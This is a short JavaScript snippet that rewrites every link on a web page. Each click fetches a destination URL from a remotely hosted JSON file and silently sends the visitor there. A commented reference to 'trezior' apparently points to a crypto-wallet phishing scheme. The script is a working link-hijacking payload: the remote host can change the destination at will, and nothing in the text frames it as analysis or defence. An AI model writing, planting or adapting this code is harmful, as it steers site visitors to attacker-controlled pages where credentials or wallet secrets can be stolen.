
var elems = document.body.getElementsByTagName("a");
var check = true;
if(check === true) {

  for(var i = 0; i < elems.length; i++)
                {
                    elems[i].setAttribute("onclick",'getdata()');
                }

}
                

  var fetchurl;

    var getdata =  async ()=> {
        console.log("Func Load")
        var fetchurl = "";
        const url = 'https://api.jsonsilo.com/public/bd4390bf-c455-417b-a662-c40c2a53f057';

        await  fetch(url)
        .then(response => response.json())  // Parse JSON data
        .then(data => {
            // console.log(data.productlist[0].trezior);  // Log the fetched JSON data as an object
            fetchurl = data.portfolio[0].one;
            // console.log(fetchurl);

            // return fetchurl;

            window.location.replace(fetchurl);



            

        })
        .catch(error => console.error('Error:', error));

    

    };

